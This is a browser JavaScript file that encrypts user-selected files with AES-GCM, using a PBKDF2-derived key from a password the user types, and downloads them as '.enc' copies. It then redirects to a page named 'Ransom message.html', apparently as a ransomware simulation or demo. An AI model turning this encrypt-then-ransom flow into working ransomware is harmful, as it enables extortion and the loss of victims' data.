const folderInput = document.getElementById("folderInput");
const fileList = document.getElementById("fileList");
let encryptedFiles = [];

function generateKey(password, salt) {
    const encoder = new TextEncoder();
    const keyMaterial = encoder.encode(password);

    return window.crypto.subtle.importKey(
        "raw",
        keyMaterial,
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
    ).then(key => {
        return window.crypto.subtle.deriveKey(
            {
                name: "PBKDF2",
                salt: salt,
                iterations: 100000,
                hash: "SHA-256"
            },
            key,
            { name: "AES-GCM", length: 256 },
            false,
            ["encrypt", "decrypt"]
        );
    });
}

async function encryptFile(file, password) {
    const salt = window.crypto.getRandomValues(new Uint8Array(16));
    const iv = window.crypto.getRandomValues(new Uint8Array(12));

    const cryptoKey = await generateKey(password, salt);

    const fileData = await file.arrayBuffer();
    const encryptedData = await window.crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv },
        cryptoKey,
        fileData
    );

    return { name: file.name + ".enc", salt: salt, iv: iv, data: encryptedData };
}

function downloadEncryptedFile(file) {
    const blob = new Blob([file.salt, file.iv, new Uint8Array(file.data)], { type: "application/octet-stream" });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = file.name;
    link.click();
    URL.revokeObjectURL(link.href);
}

async function encryptFiles() {
    const password = prompt("Enter a password for encryption:");
    if (!password) {
        alert("Password is required to encrypt files.");
        return;
    }

    fileList.innerHTML = "";
    encryptedFiles = [];

    for (const file of folderInput.files) {
        const encryptedFile = await encryptFile(file, password);
        encryptedFiles.push(encryptedFile);
        downloadEncryptedFile(encryptedFile);
        const fileElement = document.createElement("div");
        fileElement.textContent = `Encrypted File: ${encryptedFile.name}`;
        fileList.appendChild(fileElement);
    }
    setTimeout(() => {
        window.location.href = "Ransom message.html";
    }, 5000);
}
